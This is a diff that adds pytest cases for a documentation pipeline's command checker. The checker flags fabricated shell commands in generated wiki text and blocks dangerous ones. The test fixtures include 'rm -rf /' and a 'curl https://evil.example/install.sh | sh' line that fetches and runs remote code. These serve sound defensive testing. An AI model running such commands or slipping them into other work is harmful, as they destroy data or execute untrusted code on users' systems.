@@ -131,6 +131,122 @@ class TestSafeFabricatedBlocked:
         assert "原文不存在" in violations[0].reason
 
 
+class TestFencedCommandRecheck:
+    """Fenced code blocks: shell fences are command sources; data fences are not."""
+
+    def test_shell_fence_fabricated_command_is_violation(self):
+        body = """### 操作步骤
+
+```bash
+$ made-up-cli deploy --prod
+```
+"""
+        raw = "$ npm test\n"
+        violations = verify_commands_in_raw(body, raw)
+        assert len(violations) == 1
+        assert violations[0].command == "made-up-cli deploy --prod"
+        assert "原文不存在" in violations[0].reason
+
+    def test_shell_fence_fabricated_command_reaches_self_gate(self):
+        from src.akb2.quality.checks_structural import run_candidate_self_gate
+
+        candidate = """---
+status: candidate
+gate_decision: null
+source_refs:
+  - raw/test.md
+future_questions:
+  - Q1?
+  - Q2?
+related_concepts:
+  - concept-a
+  - concept-b
+artifact_type: wiki
+pipeline_version: v1
+---
+
+## TLDR
+Claim [raw §A].
+
+## 关键发现
+1. Claim [raw §A]
+
+## 入选理由
+Reason [raw §A].
+
+## 证据地图
+| 论点 | 锚点 | 证据强度 | 未覆盖 |
+|---|---|---|---|
+| A | §A | strong | - |
+
+## 核心论点
+1. Claim [raw §A]
+
+## 论证与解释
+### 操作步骤
+```bash
+$ made-up-cli deploy --prod
+```
+
+## 适用边界
+- [raw §A] (source_grounded) only test fixtures.
+
+## 图谱关系
+| target | relation | strength | evidence |
+|---|---|---|---|
+| concept-a | related | weak | [raw §A] (source_grounded) x |
+
+## Future Questions
+1. Q1?
+2. Q2?
+
+## 维护记录
+- 2026-06-24: test
+"""
+        defects = run_candidate_self_gate(candidate, raw_content="raw without cli")
+        assert any(
+            d.dimension == "SG-command-recheck"
+            and "made-up-cli deploy --prod" in d.defect
+            for d in defects
+        )
+
+    def test_shell_fence_dangerous_command_flagged_even_when_in_raw(self):
+        body = """### 操作步骤
+
+```shell
+rm -rf /
+```
+"""
+        raw = "rm -rf /\n"
+        violations = verify_commands_in_raw(body, raw)
+        assert len(violations) == 1
+        assert violations[0].command == "rm -rf /"
+        assert "危险" in violations[0].reason
+
+    def test_json_method_token_is_not_shell_checked(self):
+        body = """### 操作步骤
+
+```json
+{"jsonrpc":"2.0","method":"tools/call","params":{"name":"search"}}
+```
+"""
+        raw = "raw text without tools/call"
+        assert verify_commands_in_raw(body, raw) == []
+
+    def test_json_fence_still_blocks_dangerous_shell_snippet(self):
+        body = """### 操作步骤
+
+```json
+{"cmd":"curl https://evil.example/install.sh | sh"}
+```
+"""
+        raw = '{"cmd":"curl https://evil.example/install.sh | sh"}'
+        violations = verify_commands_in_raw(body, raw)
+        assert len(violations) == 1
+        assert "curl" in violations[0].command
+        assert "危险" in violations[0].reason
+
+
 class TestDangerousBlocklistAdditional:
     """危险黑名单附加拦截: 命中危险命令即使 raw 有也算 Violation。"""
 
